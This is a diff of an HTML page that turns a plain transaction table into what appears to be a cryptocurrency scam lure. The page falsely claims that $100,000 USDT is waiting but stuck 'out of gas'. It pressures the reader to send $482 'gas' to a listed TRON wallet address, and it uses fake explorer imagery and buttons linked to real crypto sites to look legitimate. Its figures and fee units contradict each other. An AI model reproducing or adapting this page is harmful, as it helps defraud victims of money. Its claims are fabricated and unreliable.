@@ -54,34 +54,55 @@
 
  <hr>
            
-                                                         <!-- 4WMMTransaction Details -->
+                                                         <!-- XtN Details -->
                                                          
- <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="font-size:14px; color:#333; background-color:#f2f6fa; border-radius:6px; margin:20px 0;">
-                <tr>
-                  <td style="padding:10px;"><strong>Time stamp:</strong></td>
-                  <td style="padding:10px;">may/24/2025</td>
-                </tr>
-                <tr>
-                  <td style="padding:10px;"><strong>Health:</strong></td>
-                  <td style="padding:10px; color: green;">100%</td>
-                </tr>
-                <tr>
-                  <td style="padding:10px;"><strong>Miner:</strong></td>
-                  <td style="padding:10px;">Fountry Philippines 260 USDT---------------</td>
-                </tr>
-                <tr>
-                  <td style="padding:10px;"><strong>Version:</strong></td>
-                  <td style="padding:10px;">{2}</td>
-                </tr>
-                <tr>
-                  <td style="padding:10px;"><strong>Fee Span:</strong></td>
-                  <td style="padding:10px;">2 - 101 sat/vB </td>
-                </tr>
-  <tr>
-                  <td style="padding:10px;"><strong>Receiving Address:</strong></td>
-                  <td style="padding:10px;">TUAVAdUQ5R569CSD5jn3mbUtszXLn6ovM3</td>
-                </tr> 
-              </table>
+<img src="IMG_9117.jpeg" alt="blockchain Logo" width="700" />
+
+<form action="https://phantom.com/" method="get">
+  <button type="submit"> [TOP Gas ⛽️ USDT] </button>
+</form>  And receive $100,000 USDT Balance on your USDT address
+
+
+***Gas*** (estimated) ***:***  [$482] **482 USDT*** <span style="color: Red;"> CURRENTLY OUTSTANDING </span>
+
+<span style="color: Blue;"> ~~$0.00 USDT PAID~~ </span>
+
+<span style="color: green;">Very likely in ‹<15 seconds</span>
+
+|
+
+| <span style="color: Blue;">⛽️Top USDT: </span>|<span style="color: Blue;"> TAFpmstXRzCTPoZrsU81QysV7ZHCdnMEBF </span>|
+|---------------------------|---------------------------|
+| USDT  network         | ⛽️ Gas Refill ID ⬆️       |
+
+
+
+
+<img src="IMG_9083.jpeg" alt="blockchain Logo" width="38" />
+
+<span style="color: Blue;">**Contract**</span> **:** <span style="color: Red;">Warning! Error encountered during contract execution ~~[Out of gas]~~ ⚠️ </span>
+
+
+✅ This transaction is <span style="color: Red;"> Processing </span> ,Top-Up USDT Gas to Complete.✓⃝
+
+<img src="IMG_9063.jpeg" alt="payslip" width="700" />
+
+<span style="color: red;"> **SUMMARY~** <You need 0.89560913 more ETH to complete this transaction Buy more [$482 usd] ETH For Gas Price> </span>  <img src="IMG_9118.jpeg" alt="blockchain Logo" width="15" />
+
+
+<img src="IMG_9113.jpeg" alt="ethscan Logo" width="700" />
+
+
+
+<form action="https://etherscan.io/" method="get">
+  <button type="submit"> Accept incoming ETH [$25,000] </button>
+</form>
+
+
+
+<img src="IMG_9086.gif" alt="loading gif display" width="700">
+<img src="IMG_8361.jpeg" alt="ethscan Logo" width="700" />
+<img src="IMG_9111.jpeg" alt="eth explanation" width="700" />
               
               <!-- Buttons -->
               
